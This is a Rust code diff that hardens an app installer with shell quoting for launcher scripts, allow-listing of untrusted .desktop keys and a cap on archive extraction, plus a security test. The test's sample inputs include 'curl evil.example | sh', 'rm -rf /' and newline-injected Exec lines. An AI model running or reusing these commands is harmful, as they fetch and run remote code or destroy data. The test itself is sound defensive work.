@@ -223,15 +223,12 @@ where
                         .unwrap_or(&plan.app_id)
                         .to_ascii_lowercase();
                     let wrapper = safe_join(&app_dir, Path::new(&format!("{bin_name}-run.sh")))?;
+                    let dest_q = shell_single_quote(&dest.to_string_lossy());
                     let script = if nix_wrap {
-                        format!(
-                            "#!/bin/sh\nexec appimage-run \"{}\" \"$@\"\n",
-                            dest.to_string_lossy()
-                        )
+                        format!("#!/bin/sh\nexec appimage-run {dest_q} \"$@\"\n")
                     } else {
                         format!(
-                            "#!/bin/sh\nexport APPIMAGE_EXTRACT_AND_RUN=1\nexec \"{}\" \"$@\"\n",
-                            dest.to_string_lossy()
+                            "#!/bin/sh\nexport APPIMAGE_EXTRACT_AND_RUN=1\nexec {dest_q} \"$@\"\n"
                         )
                     };
                     fs::write(&wrapper, script)?;
@@ -261,10 +258,8 @@ where
                     .unwrap_or(&plan.app_id)
                     .to_ascii_lowercase();
                 let wrapper = safe_join(&app_dir, Path::new(&bin_name))?;
-                let script = format!(
-                    "#!/bin/sh\nexec java -jar \"{}\" \"$@\"\n",
-                    jar_dest.to_string_lossy()
-                );
+                let jar_q = shell_single_quote(&jar_dest.to_string_lossy());
+                let script = format!("#!/bin/sh\nexec java -jar {jar_q} \"$@\"\n");
                 fs::write(&wrapper, script)?;
                 fs::set_permissions(&wrapper, fs::Permissions::from_mode(0o755))?;
                 tx.record_file(wrapper.clone());
@@ -734,67 +729,85 @@ fn write_hicolor_icon(
     Ok(Some(dest))
 }
 
+/// Safe metadata keys allowed from an untrusted embedded `.desktop` file's `[Desktop Entry]`
+/// section. All `Exec=`, `TryExec=`, and `[Desktop Action ...]` blocks are never passed through.
+const SAFE_DESKTOP_KEYS: &[&str] = &[
+    "Name=",
+    "GenericName=",
+    "Comment=",
+    "Categories=",
+    "Keywords=",
+    "MimeType=",
+    "StartupNotify=",
+    "StartupWMClass=",
+    "Terminal=",
+];
+
+fn sanitize_desktop_value(s: &str) -> String {
+    s.replace(['\r', '\n'], " ").trim().to_string()
+}
+
+fn shell_single_quote(s: &str) -> String {
+    format!("'{}'", s.replace('\'', "'\\''"))
+}
+
 fn render_desktop_entry(plan: &InstallPlan, exec_path: &Path, icon_name: Option<&str>) -> String {
     let exec_quoted = quote_desktop_exec(exec_path);
-    if let Some(existing) = &plan.desktop_entry {
-        let mut out = Vec::new();
-        let mut wrote_exec = false;
-        let mut wrote_icon = false;
-        let mut wrote_wm = false;
-        for line in existing.lines() {
-            let trimmed = line.trim();
-            if trimmed.starts_with("Exec=") {
-                out.push(format!("Exec={exec_quoted}"));
-                wrote_exec = true;
-            } else if trimmed.starts_with("Icon=") {
-                if let Some(ic) = icon_name {
-                    out.push(format!("Icon={ic}"));
-                    wrote_icon = true;
-                } else {
-                    out.push(line.to_string());
-                    wrote_icon = true;
-                }
-            } else if trimmed.starts_with("StartupWMClass=") {
-                wrote_wm = true;
-                out.push(line.to_string());
-            } else {
-                out.push(line.to_string());
-            }
-        }
-        if !wrote_exec {
-            out.push(format!("Exec={exec_quoted}"));
-        }
-        if !wrote_icon && let Some(ic) = icon_name {
-            out.push(format!("Icon={ic}"));
-        }
-        if !wrote_wm && let Some(wm) = &plan.startup_wm_class {
-            out.push(format!("StartupWMClass={wm}"));
-        }
-        return out.join("\n") + "\n";
-    }
-
     let mut lines = vec![
         "[Desktop Entry]".to_string(),
         "Type=Application".to_string(),
-        format!("Name={}", plan.name),
-        format!("Exec={exec_quoted}"),
-        "Terminal=false".to_string(),
     ];
-    if let Some(ic) = icon_name {
-        lines.push(format!("Icon={ic}"));
+    let mut wrote_name = false;
+    let mut wrote_terminal = false;
+    let mut wrote_wm = false;
+
+    if let Some(existing) = &plan.desktop_entry {
+        let mut in_main = false;
+        for raw_line in existing.lines() {
+            let trimmed = raw_line.trim();
+            if trimmed.starts_with('[') && trimmed.ends_with(']') {
+                in_main = trimmed == "[Desktop Entry]";
+                continue;
+            }
+            if !in_main || trimmed.is_empty() || trimmed.starts_with('#') {
+                continue;
+            }
+            if SAFE_DESKTOP_KEYS.iter().any(|k| trimmed.starts_with(k)) {
+                let clean = sanitize_desktop_value(trimmed);
+                if clean.starts_with("Name=") {
+                    wrote_name = true;
+                } else if clean.starts_with("Terminal=") {
+                    wrote_terminal = true;
+                } else if clean.starts_with("StartupWMClass=") {
+                    wrote_wm = true;
+                }
+                lines.push(clean);
+            }
+        }
     }
-    if let Some(wm) = &plan.startup_wm_class {
-        lines.push(format!("StartupWMClass={wm}"));
+
+    if !wrote_name {
+        lines.push(format!("Name={}", sanitize_desktop_value(&plan.name)));
+    }
+    lines.push(format!("Exec={exec_quoted}"));
+    if !wrote_terminal {
+        lines.push("Terminal=false".to_string());
+    }
+    if let Some(ic) = icon_name {
+        lines.push(format!("Icon={}", sanitize_desktop_value(ic)));
+    }
+    if !wrote_wm && let Some(wm) = &plan.startup_wm_class {
+        lines.push(format!("StartupWMClass={}", sanitize_desktop_value(wm)));
     }
     lines.join("\n") + "\n"
 }
 
 fn quote_desktop_exec(path: &Path) -> String {
-    let s = path.to_string_lossy();
+    let s = sanitize_desktop_value(&path.to_string_lossy());
     if s.contains(' ') {
         format!("\"{s}\"")
     } else {
-        s.into_owned()
+        s
     }
 }
 
@@ -834,9 +847,38 @@ pub fn extract_archive_safe(
     }
 }
 
+/// Hard cap on total bytes extracted from a single archive (guards against decompression bombs).
+const MAX_EXTRACT_BYTES: u64 = 16 * 1024 * 1024 * 1024;
+
+fn copy_limited<R: Read + ?Sized>(
+    reader: &mut R,
+    dest: &Path,
+    extracted_total: &mut u64,
+) -> Result<(), EasiError> {
+    if dest
+        .symlink_metadata()
+        .is_ok_and(|m| m.file_type().is_symlink())
+    {
+        fs::remove_file(dest)?;
+    }
+    let remaining = MAX_EXTRACT_BYTES.saturating_sub(*extracted_total);
+    let mut limited = reader.take(remaining.saturating_add(1));
+    let mut out = File::create(dest)?;
+    let copied = std::io::copy(&mut limited, &mut out)?;
+    *extracted_total = extracted_total.saturating_add(copied);
+    if *extracted_total > MAX_EXTRACT_BYTES {
+        let _ = fs::remove_file(dest);
+        return Err(EasiError::Archive(
+            "archive exceeds maximum safe extracted size (16 GiB)".into(),
+        ));
+    }
+    Ok(())
+}
+
 fn extract_sevenz_safe(path: &Path, dest_root: &Path) -> Result<(), EasiError> {
     let mut reader = sevenz_rust::SevenZReader::open(path, sevenz_rust::Password::empty())
         .map_err(|e| EasiError::Archive(e.to_string()))?;
+    let mut total = 0u64;
     reader
         .for_each_entries(|entry, data| {
             let rel = PathBuf::from(entry.name());
@@ -851,8 +893,8 @@ fn extract_sevenz_safe(path: &Path, dest_root: &Path) -> Result<(), EasiError> {
                 if let Some(parent) = dest.parent() {
                     fs::create_dir_all(parent)?;
                 }
-                let mut out = File::create(&dest)?;
-                std::io::copy(data, &mut out)?;
+                copy_limited(data, &dest, &mut total)
+                    .map_err(|e| sevenz_rust::Error::other(e.to_string()))?;
             }
             Ok(true)
         })
@@ -890,6 +932,7 @@ fn extract_tar_safe<R: Read>(reader: R, dest_root: &Path) -> Result<(), EasiErro
         .entries()
         .map_err(|e| EasiError::Archive(e.to_string()))?;
 
+    let mut total = 0u64;
     for item in entries {
         let mut entry = item.map_err(|e| EasiError::Archive(e.to_string()))?;
         let rel = entry
@@ -924,8 +967,7 @@ fn extract_tar_safe<R: Read>(reader: R, dest_root: &Path) -> Result<(), EasiErro
             if let Some(parent) = dest.parent() {
                 fs::create_dir_all(parent)?;
             }
-            let mut out = File::create(&dest)?;
-            std::io::copy(&mut entry, &mut out)?;
+            copy_limited(&mut entry, &dest, &mut total)?;
             fs::set_permissions(&dest, fs::Permissions::from_mode(mode))?;
         }
     }
@@ -937,6 +979,7 @@ fn extract_zip_safe(path: &Path, dest_root: &Path) -> Result<(), EasiError> {
     let mut zip =
         ZipArchive::new(BufReader::new(file)).map_err(|e| EasiError::Archive(e.to_string()))?;
 
+    let mut total = 0u64;
     for i in 0..zip.len() {
         let mut entry = zip
             .by_index(i)
@@ -969,8 +1012,7 @@ fn extract_zip_safe(path: &Path, dest_root: &Path) -> Result<(), EasiError> {
             if let Some(parent) = dest.parent() {
                 fs::create_dir_all(parent)?;
             }
-            let mut out = File::create(&dest)?;
-            std::io::copy(&mut entry, &mut out)?;
+            copy_limited(&mut entry, &dest, &mut total)?;
             fs::set_permissions(&dest, fs::Permissions::from_mode(mode & 0o777))?;
         }
     }
@@ -1409,5 +1451,63 @@ mod tests {
         assert_eq!(freed, 6);
         assert!(!cache_dir.exists());
         assert!(config_dir.exists());
+    }
+
+    #[test]
+    fn security_shell_single_quote_and_desktop_sanitization() {
+        // 1. Shell quoting neutralizes $(), backticks, double quotes, and single quotes.
+        assert_eq!(
+            shell_single_quote("/tmp/foo$(rm -rf /)`id`'bar'.jar"),
+            "'/tmp/foo$(rm -rf /)`id`'\\''bar'\\''.jar'"
+        );
+
+        // 2. Untrusted .desktop file with malicious [Desktop Action] and newline injection
+        //    must have only safe [Desktop Entry] keys preserved and zero injected Exec lines.
+        let evil_desktop = "\
+[Desktop Entry]
+Name=GoodApp
+Comment=Safe comment
+Categories=Utility;
+Exec=/bin/sh -c 'curl evil.example | sh'
+TryExec=/tmp/evil
+
+[Desktop Action evil]
+Name=Launch
+Exec=/bin/sh -c 'pwned'
+";
+        let plan = InstallPlan {
+            source_path: PathBuf::from("/tmp/goodapp.tar.gz"),
+            format: Format::TarGz,
+            app_id: "easi.goodapp".into(),
+            synthesized_id: true,
+            name: "GoodApp\nExec=/tmp/pwn".into(),
+            version: Some("1.0".into()),
+            kind: crate::model::AppKind::Gui,
+            main_exec: "bin/goodapp".into(),
+            icon_path: None,
+            icon_bytes: None,
+            desktop_entry: Some(evil_desktop.into()),
+            startup_wm_class: Some("GoodApp\nExec=/tmp/pwn2".into()),
+            developer: None,
+            origin_url: None,
+            signature_summary: None,
+            update_source: None,
+            planned_writes: vec![],
+        };
+        let rendered = render_desktop_entry(
+            &plan,
+            Path::new("/home/u/Applications/GoodApp/bin/goodapp"),
+            Some("easi.goodapp"),
+        );
+        assert!(!rendered.contains("pwned"));
+        assert!(!rendered.contains("\nExec=/tmp/pwn"));
+        assert!(!rendered.contains("evil.example"));
+        assert!(!rendered.contains("[Desktop Action"));
+        assert!(!rendered.contains("TryExec="));
+        assert_eq!(
+            rendered.lines().filter(|l| l.starts_with("Exec=")).count(),
+            1,
+            "must emit exactly one trusted Exec= line"
+        );
     }
 }
